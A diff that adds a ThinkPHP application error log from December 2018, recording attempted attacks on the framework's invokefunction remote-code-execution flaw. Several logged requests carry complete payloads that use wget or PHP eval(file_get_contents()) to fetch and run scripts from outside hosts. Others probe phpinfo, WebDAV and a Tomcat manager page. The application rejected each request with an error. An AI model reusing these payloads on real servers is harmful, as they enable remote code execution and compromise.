@@ -1,0 +1,24 @@
+[ 2018-12-22T02:42:53+08:00 ] 80.211.89.146 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=rm%20-rf%20a.sh;%20busybox%20wget%20http://80.211.89.146/a.sh;%20chmod%20+x%20a.sh;%20sh%20a.sh
+ERR: 非法操作:\think\app
+
+[ 2018-12-22T10:48:00+08:00 ] 100.15.179.195 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-d%20allow_url_fopen%3Dtrue%20-r%20%22eval(file_get_contents('http://safetymango.website:8082/qcemsR6U2KDl'));%22
+ERR: 非法操作:\think\app
+
+[ 2018-12-22T10:48:01+08:00 ] 100.15.179.195 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-d%20allow_url_fopen%3Dtrue%20-r%20%22eval(file_get_contents('http://safetymango.website:8080/DrIGQO9YohBx3Wm'));%22
+ERR: 非法操作:\think\app
+
+[ 2018-12-22T10:49:27+08:00 ] 34.214.188.65 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=php%20-d%20allow_url_fopen%3Dtrue%20-r%20%22eval(file_get_contents('http://safetymango.website:8080/DrIGQO9YohBx3Wm'));%22
+ERR: 非法操作:\think\app
+
+[ 2018-12-22T15:22:31+08:00 ] 80.211.89.146 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;%20wget%20http://80.211.89.146/z.sh;%20chmod%20+x%20z.sh;%20sh%20z.sh;rm%20-rf%20z.sh
+ERR: 非法操作:\think\app
+
+[ 2018-12-22T18:59:37+08:00 ] 178.62.196.139 /index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+ERR: 非法操作:\think\app
+
+[ 2018-12-22T19:28:18+08:00 ] 122.114.224.204 /webdav/
+ERR: 无法加载控制器:Webdav
+
+[ 2018-12-22T19:34:14+08:00 ] 122.114.224.204 /manager/html
+ERR: 无法加载控制器:Manager
+
